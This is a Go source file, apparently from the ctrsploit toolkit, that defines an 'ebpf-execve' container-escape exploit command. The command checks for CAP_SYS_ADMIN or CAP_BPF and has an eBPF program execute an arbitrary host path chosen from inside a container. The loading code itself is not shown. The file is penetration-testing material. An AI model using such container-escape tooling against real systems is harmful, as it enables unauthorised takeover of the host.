package execve

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	aliases      = []string{"execve"}
	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:    "path",
			Aliases: []string{"p"},
			Usage:   "absolute path to execute, if the -c option is set, the path will auto prepend with /proc/[pid]/root/",
			Value:   "/usr/bin/id",
		},
		&cli.BoolFlag{
			Name:    "relative",
			Aliases: []string{"r"},
			Usage: "If this option is set, the path is treated as a path within a container. " +
				"It will be automatically prepended with /proc/[pid]/root/ to enable access from the host. " +
				"Otherwise, the path is considered a host path and executed directly by the eBPF program.",
			Value: false,
		},
	}
	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd     = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "ebpf-execve",
		Description: "",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites: prerequisite.Or(
			&capability.CapSysAdminBnd,
			&capability.CapBpfBnd,
		),
		ExploitablePrerequisites: &capability.CapSysAdminEff,
	},
}

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	if err := v.BaseVulnerability.Exploit(context); err != nil {
		return err
	}
	return Exploit(context.String("path"), context.Bool("relative"))
}

func Exploit(path string, relative bool) (err error) {
	return Load(path, relative)
}
